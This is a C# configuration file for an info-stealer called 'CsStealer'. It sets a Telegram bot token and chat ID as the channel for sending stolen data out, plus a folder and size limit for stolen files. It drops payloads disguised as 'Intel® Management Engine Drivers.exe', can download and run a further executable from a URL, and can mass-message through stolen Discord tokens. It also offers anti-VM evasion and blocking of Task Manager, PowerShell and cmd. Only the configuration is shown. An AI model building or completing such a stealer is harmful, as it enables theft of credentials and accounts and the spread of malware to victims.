using System;

namespace CsStealer
{
    public class Config
    {
        public class C2
        {
            public static string TelegramBotToken = "You bot token here";
            public static string TelegramChatID = "You chat id here";
        }
        
        // The temporary directory to store the stolen datas while processing (don't touch if you don't understand)
        public static string OutputDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "TmpDatas"); // This is C:\Users\username\TmpDatas

        // The size limit for the stolen files directory
        public static int StolenFilesLogMaxSize = 75;

        // The path where the executable for browsers recovery is dropped, if you dont understand don't touch
        public static string BrowsersPayloadDistPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Intel® Management Engine Drivers.exe");


        // If you want it to drop and run while processing, put true and put the file's direct url in ExecutableToDropURL
        // You can change the drop path but don't change if you don't understand
        public static bool DropAnExecutable = false;
        public static string ExecutableToDropDistPath = Path.Combine(Path.GetTempPath(), "Intel® Management Engine Drivers.exe");
        public static string ExecutableToDropURL = "leave empty if DropAnExecutable is false or put the direct file url (e.g. : https://example.com/files/MyFile.exe)";


        // If you want to DMall a message with all valid Discord tokens found put true and enter the message in AutoDiscordDMAllMessageContent
        public static bool AutoDiscordDMAll = false;
        public static string AutoDiscordDMAllMessageContent = "Leave empty if AutoDiscordDMAll is false or put the message to dmall.";


        // If you don't want to enable Anti VM put false
        public static bool EnableAntiVM = true;


        // If you want to block the task manager, powershell, cmd, ... put true
        public static bool BlockApps = false;
    }
}